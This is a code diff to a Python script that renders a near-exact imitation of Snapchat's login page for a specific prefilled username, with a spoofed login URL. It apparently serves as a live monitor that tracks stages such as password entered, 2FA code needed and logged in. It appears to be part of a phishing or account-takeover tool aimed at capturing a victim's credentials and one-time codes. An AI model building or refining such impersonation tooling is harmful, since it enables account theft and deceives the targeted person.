@@ -18,8 +18,8 @@ state = {
     'update_count': 0
 }
 
-def make_fresh_image():
-    """Always creates a fresh image based on current state"""
+def generate_image():
+    """Always creates a fresh image based on current state. Matches real Snapchat login visual."""
     from PIL import Image, ImageDraw, ImageFont
     
     w, h = 1280, 720
@@ -28,85 +28,101 @@ def make_fresh_image():
 
     try:
         f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
-        f2 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 13)
+        f2 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
+        f3 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
     except:
-        f = f2 = ImageFont.load_default()
+        f = f2 = f3 = ImageFont.load_default()
 
     stage = state['stage']
     now = datetime.now().strftime("%H:%M:%S")
     state['update_count'] += 1
 
-    # Black
+    # Black background
     draw.rectangle([0, 0, w, h], fill='#000000')
 
-    # Top Snapchat bar
-    draw.rectangle([0, 0, w, 38], fill='#111111')
-    draw.text((w//2 - 60, 1), "Snapchat", fill='#FFFC00', font=f)
+    # Top Snapchat bar (exact Snapchat dark header)
+    draw.rectangle([0, 0, w, 42], fill='#111111')
+    draw.text((w//2 - 65, 8), "Snapchat", fill='#FFFC00', font=f)
 
-    # Main card
-    cx, cy = 420, 50
-    draw.rounded_rectangle([cx, cy, cx+440, cy+460], radius=9, fill='#1f1f1f')
-    draw.text((cx+15, cy+8), "Log in to Snapchat", fill='white', font=f2)
+    # Main centered login card (realistic Snapchat dark card)
+    cx, cy = 420, 55
+    draw.rounded_rectangle([cx, cy, cx+440, cy+470], radius=16, fill='#1f1f1f')
+    
+    # Header
+    draw.text((cx+18, cy+14), "Log in to Snapchat", fill='white', font=f2)
 
-    # Username
-    draw.rounded_rectangle([cx+15, cy+45, cx+425, cy+80], radius=5, fill='#2c2c2c')
-    draw.text((cx+26, cy+52), "zexoghaith", fill='white', font=f2)
+    # Username field - prefilled like real (matches "zexoghaith")
+    draw.rounded_rectangle([cx+18, cy+52, cx+422, cy+88], radius=8, fill='#2c2c2c')
+    draw.text((cx+30, cy+60), "zexoghaith", fill='white', font=f3)
 
-    # Password
-    draw.rounded_rectangle([cx+15, cy+90, cx+425, cy+125], radius=5, fill='#2c2c2c')
-    if stage != 'login':
-        draw.text((cx+26, cy+97), "••••••••••", fill='#22c55e', font=f2)
+    # Password field
+    draw.rounded_rectangle([cx+18, cy+100, cx+422, cy+136], radius=8, fill='#2c2c2c')
+    if stage in ['password', '2fa', 'done']:
+        draw.text((cx+30, cy+107), "••••••••••", fill='#22c55e', font=f3)  # filled green when submitted
     else:
-        draw.text((cx+26, cy+97), "••••••••••", fill='#888888', font=f2)
+        draw.text((cx+30, cy+107), "••••••••••", fill='#888888', font=f3)
 
-    # Button
-    by = cy + 140
+    # Big yellow Log In button (exact Snapchat style)
+    by = cy + 155
     if stage == 'password':
-        draw.rounded_rectangle([cx+15, by, cx+425, by+36], radius=12, fill='#444444')
-        draw.text((cx+95, by+7), "Logging in...", fill='#999999', font=f2)
+        draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#444444')
+        draw.text((cx+130, by+12), "Logging in...", fill='#aaaaaa', font=f2)
     else:
-        draw.rounded_rectangle([cx+15, by, cx+425, by+36], radius=12, fill='#FFFC00')
-        draw.text((cx+145, by+7), "Log In", fill='#000000', font=f2)
+        draw.rounded_rectangle([cx+18, by, cx+422, by+44], radius=22, fill='#FFFC00')
+        draw.text((cx+170, by+12), "Log In", fill='#000000', font=f2)
 
-    # Social
-    draw.rounded_rectangle([cx+15, by+45, cx+425, by+75], radius=10, fill='#2c2c2c')
-    draw.text((cx+80, by+52), "Continue with Google", fill='white', font=f2)
+    # "or" divider
+    draw.text((cx+195, by+55), "or", fill='#666666', font=f3)
 
-    draw.rounded_rectangle([cx+15, by+82, cx+425, by+112], radius=10, fill='#2c2c2c')
-    draw.text((cx+85, by+89), "Continue with Apple", fill='white', font=f2)
+    # Continue with Google
+    draw.rounded_rectangle([cx+18, by+80, cx+422, by+115], radius=22, fill='#2c2c2c')
+    draw.text((cx+115, by+88), "Continue with Google", fill='white', font=f3)
 
-    # === BIG BANNER - ONLY SHOWS WHEN PASSWORD SUBMITTED ===
+    # Continue with Apple
+    draw.rounded_rectangle([cx+18, by+125, cx+422, by+160], radius=22, fill='#2c2c2c')
+    draw.text((cx+120, by+133), "Continue with Apple", fill='white', font=f3)
+
+    # Use phone number instead link (real Snapchat)
+    draw.text((cx+105, by+175), "Use phone number instead", fill='#888888', font=f3)
+
+    # === BIG STAGE BANNERS - EXACTLY as required ===
     if stage == 'password':
-        draw.rounded_rectangle([cx+10, cy+175, cx+430, cy+275], radius=6, fill='#3f2a00')
-        draw.text((cx+18, cy+188), "PASSWORD ENTERED", fill='#f59e0b', font=f)
-        draw.text((cx+18, cy+220), "Log In button was clicked", fill='white', font=f2)
-        draw.text((cx+18, cy+245), "Waiting for Snapchat...", fill='#888888', font=f2)
+        # Big orange banner for password submitted
+        draw.rounded_rectangle([cx+12, cy+200, cx+428, cy+305], radius=10, fill='#3f2a00')
+        draw.text((cx+25, cy+212), "PASSWORD ENTERED", fill='#f59e0b', font=f)
+        draw.text((cx+25, cy+248), "Log In button was clicked", fill='white', font=f2)
+        draw.text((cx+25, cy+275), "Waiting for Snapchat...", fill='#aaaaaa', font=f3)
 
     if stage == '2fa':
-        draw.rounded_rectangle([cx+10, cy+175, cx+430, cy+300], radius=6, fill='#1e3a8a')
-        draw.text((cx+22, cy+188), "2FA CODE NEEDED", fill='#60a5fa', font=f)
-        draw.text((cx+22, cy+220), "Enter 6-digit code", fill='white', font=f2)
+        draw.rounded_rectangle([cx+12, cy+200, cx+428, cy+330], radius=10, fill='#1e3a8a')
+        draw.text((cx+28, cy+212), "2FA CODE NEEDED", fill='#60a5fa', font=f)
+        draw.text((cx+28, cy+250), "Enter 6-digit code from Snapchat", fill='white', font=f2)
+        # 2FA input boxes (realistic)
         for i in range(6):
-            draw.rectangle([cx+28 + i*35, cy+250, cx+28 + i*35 + 28, cy+278], outline='#3b82f6', width=2)
+            x = cx + 35 + i * 58
+            draw.rounded_rectangle([x, cy+280, x+48, cy+315], radius=6, fill='#0f172a', outline='#3b82f6', width=2)
+            draw.text((x+18, cy+286), str(i+1), fill='#555555', font=f3)
 
     if stage == 'done':
-        draw.rounded_rectangle([cx+10, cy+175, cx+430, cy+300], radius=6, fill='#052e16')
-        draw.text((cx+60, cy+210), "✓ LOGGED IN!", fill='#22c55e', font=f)
+        draw.rounded_rectangle([cx+12, cy+200, cx+428, cy+300], radius=10, fill='#052e16')
+        draw.text((cx+95, cy+225), "✓ LOGGED IN SUCCESSFULLY", fill='#22c55e', font=f)
 
-    # Proof that it's live and changing
-    draw.rounded_rectangle([10, 555, 260, 595], radius=4, fill='#ef4444')
-    draw.text((14, 560), f"UPDATE #{state['update_count']}", fill='white', font=f)
+    # Bottom live proof
+    draw.rounded_rectangle([12, 560, 265, 600], radius=5, fill='#ef4444')
+    draw.text((18, 568), f"UPDATE #{state['update_count']}", fill='white', font=f2)
 
-    draw.rounded_rectangle([10, 605, 420, 650], radius=4, fill='#22c55e')
-    draw.text((14, 610), f"TIME: {now}", fill='black', font=f)
+    draw.rounded_rectangle([12, 610, 430, 655], radius=5, fill='#22c55e')
+    draw.text((18, 618), f"TIME: {now}", fill='black', font=f2)
 
-    draw.text((440, 615), f"STAGE: {stage}", fill='#ff8800', font=f2)
+    draw.text((450, 620), f"STAGE: {stage.upper()}", fill='#ffaa00', font=f2)
 
-    draw.rectangle([0, h-32, w, h], fill='#111111')
-    draw.text((8, h-25), "LIVE • changes only after you submit", fill='#22c55e', font=f2)
+    # Footer bar
+    draw.rectangle([0, h-30, w, h], fill='#111111')
+    draw.text((12, h-24), "accounts.snapchat.com/accounts/login  •  LIVE monitor (changes ONLY on submit)", fill='#22c55e', font=f3)
 
     path = os.path.join(STATIC_DIR, 'screenshot.png')
     img.save(path, 'PNG')
+    print(f"[IMG] Generated fresh {stage} screenshot (#{state['update_count']}) size={os.path.getsize(path)}")
     return path
 
 def screenshot_loop():
